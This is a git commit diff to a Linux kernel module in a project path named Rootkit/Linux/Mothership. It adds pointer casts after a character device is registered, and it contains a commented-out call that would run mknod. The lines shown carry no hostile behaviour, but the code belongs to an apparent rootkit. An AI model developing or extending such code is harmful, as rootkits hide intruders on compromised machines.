617a51ab7f267c5175c50e5125d75fa85b4e91e7
oonray <alexanderbjornsrid@gmail.com>
2019-02-03 16:12:53 +0100

    fixed Struct

--- Rootkit/Linux/Mothership/mothership.c
+++ Rootkit/Linux/Mothership/mothership.c
@@ -45,8 +45,8 @@ static int __init mothership_init(void)
 	log_success("Module Loaded");
 	
 	dev.major = register_chrdev(0, dev.name, &fops);
-	dev.args[0] = &dev.name;
-	dev.args[1] = &dev.type;
+	dev.args[0] = (char *)&dev.name;
+	dev.args[1] = (char *)&dev.type;
 	dev.args[2] = (char *)&dev.major;
 
 	//call_usermodehelper("/bin/mknod", args , dev.envp, UMH_NO_WAIT);
